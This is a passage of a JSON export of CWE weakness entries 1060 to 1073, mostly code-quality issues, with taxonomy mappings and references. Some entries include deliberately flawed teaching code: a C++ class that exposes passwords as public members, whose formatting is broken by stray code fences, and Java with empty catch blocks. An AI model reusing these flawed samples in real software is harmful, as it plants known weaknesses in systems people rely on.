          "EntryID": "Part 2-4",
          "EntryName": "Req SP.02.03 BR"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 2-4",
          "EntryName": "Req SP.02.03 RE(1)"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 2-4",
          "EntryName": "Req SP.03.03 RE(1)"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-3"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-4"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-5"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-6"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SG-7"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1248",
          "Section": "Poorly Documented or Undocumented Features",
          "Authors": [
            "Securing Energy Infrastructure Executive Task Force (SEI ETF)"
          ],
          "Title": "Categories of Security Vulnerabilities in ICS",
          "PublicationYear": "2022",
          "PublicationMonth": "03",
          "PublicationDay": "09",
          "URL": "https://inl.gov/wp-content/uploads/2022/03/SEI-ETF-NCSV-TPT-Categories-of-Security-Vulnerabilities-ICS-v1_03-09-22.pdf"
        },
        {
          "ExternalReferenceID": "REF-1254",
          "Authors": [
            "FDA"
          ],
          "Title": "Cybersecurity in Medical Devices: Quality System Considerations and Content of Premarket Submissions Draft Guidance for Industry and Food and Drug Administration Staff (DRAFT GUIDANCE)",
          "PublicationYear": "2022",
          "PublicationMonth": "04",
          "PublicationDay": "08",
          "URL": "https://www.fda.gov/media/119933/download"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1060",
      "Name": "Excessive Number of Inefficient Server-Side Data Accesses",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs too many data queries without using efficient data processing functionality such as stored procedures.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly due to computational expense. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"too many data queries\" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-9"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-9",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1061",
      "Name": "Insufficient Encapsulation",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-212",
          "Entries": [
            {
              "IntroText": "The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\t#define MAX_PASSWORD_LENGTH 15\n\t#define MAX_USERNAME_LENGTH 15\n\tclass UserAccount\n\t{\n\t\t\tpublic:\n\t\t\t\t\tUserAccount(char *username, char *password)\n\t\t\t\t\t{\n\t\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tstrcpy(this->username, username);\n\t\t\t\t\t\tstrcpy(this->password, password);\n\t\t\t\t\t}\n\t\t\tint authorizeAccess(char *username, char *password)\n\t\t\t{\n\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t}\n```\n// if the username and password in the input parameters are equal to* \n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// the username and password of this account class then authorize access* \n\t\t\t\t\tif (strcmp(this->username, username) ||\n\t\t\t\t\tstrcmp(this->password, password))\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 0;\n```\n// otherwise do not authorize access* \n\t\t\t\t\telse\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 1;\n\t\t\t}\n\t\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"
            },
            {
              "BodyText": "However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tclass UserAccount\n\t{\n\tpublic:\n\t\t...\n\tprivate:\n\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-3860",
          "Description": "variables declared public allow remote read of system properties such as user name and home directory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3860"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-969",
          "Authors": [
            "Wikipedia"
          ],
          "Title": "Encapsulation (computer programming)",
          "URL": "https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "1062",
      "Name": "Parent Class with References to Child Class",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code has a parent class that contains references to a child class, its methods, or its members.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-14"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-14",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1063",
      "Name": "Creation of Class Instance within a Static Code Block",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A static code block creates an instance of a class.",
      "ExtendedDescription": "\n\nThis pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static.\n\n\nThis issue can make the product perform more slowly by performing initialization before it is needed. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1176",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-1"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-1",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1064",
      "Name": "Invokable Control Element with Signature Containing an Excessive Number of Parameters",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a function, subroutine, or method whose signature has an unnecessarily large number of\n\t\t\t\t\tparameters/arguments.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of parameters.\" may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1120",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-13"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-13",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1065",
      "Name": "Runtime Resource Management Control Element in a Component Built to Run on Application Servers",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-5"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-5",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1066",
      "Name": "Missing Serialization Control Element",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a serializable data element that does not\n\t\t\t\t\thave an associated serialization method.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. by triggering an exception. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nAs examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-2"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-2",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1067",
      "Name": "Excessive Execution of Sequential Searches of Data Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a data query against an SQL table or view\n\t\t\t\t\tthat is configured in a way that does not utilize an index and may cause\n\t\t\t\t\tsequential searches to be performed.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1176",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-5"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-5",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1068",
      "Name": "Inconsistency Between Implementation and Documented Design",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The implementation of the product is not consistent with the\n\t\t\t\t\tdesign as described within the relevant documentation.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-963",
          "Authors": [
            "Robert A. Martin",
            "Lawrence H. Shafer"
          ],
          "Title": "Providing a Framework for Effective Software Quality Assessment",
          "PublicationYear": "1996",
          "PublicationMonth": "07",
          "URL": "https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1069",
      "Name": "Empty Exception Block",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "An invokable code block contains an exception handling block that does not contain any code, i.e. is empty.",
      "ExtendedDescription": "\n\nWhen an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1071",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "For every exception block add code that handles the specific exception in the way intended by the application."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-213",
          "Entries": [
            {
              "IntroText": "In the following Java example, the code catches an ArithmeticException."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t}\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Since the exception block is empty, no action is taken."
            },
            {
              "BodyText": "In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t\tlog.error(\"Divided by zero detected, setting to -1.\"); \n\t\t\t\tc = -1;\n\t\t\t}\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-1"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-1",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1070",
      "Name": "Serializable Data Element Containing non-Serializable Item Elements",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a serializable, storable data element such as a field or member,\n\t\t\t\t\tbut the data element contains member elements that are not\n\t\t\t\t\tserializable.",
      "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nAs examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-RLB-3"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-RLB-3",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1071",
      "Name": "Empty Code Block",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The source code contains a block that does not contain any code, i.e., the block is empty.",
      "ExtendedDescription": "\n\nEmpty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc. While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc. For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1164",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Reliability"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-213",
          "Entries": [
            {
              "IntroText": "In the following Java example, the code catches an ArithmeticException."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t}\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Since the exception block is empty, no action is taken."
            },
            {
              "BodyText": "In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t\tlog.error(\"Divided by zero detected, setting to -1.\"); \n\t\t\t\tc = -1;\n\t\t\t}\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-214",
          "Entries": [
            {
              "IntroText": "The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tsynchronized(this) { }\n```"
            },
            {
              "BodyText": "Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tpublic void setID(int ID){\n\t\tsynchronized(this){\n\t\t\tthis.ID = ID;\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1072",
      "Name": "Data Resource Access without Use of Connection Pooling",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product accesses a data resource through a database without using a\n\t\t\t\t\tconnection pooling capability.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-13"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-13",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-974",
          "Authors": [
            "Wikipedia"
          ],
          "Title": "Connection pool",
          "URL": "https://en.wikipedia.org/wiki/Connection_pool"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1073",
      "Name": "Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large number of data accesses/queries\" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-10"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-10",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
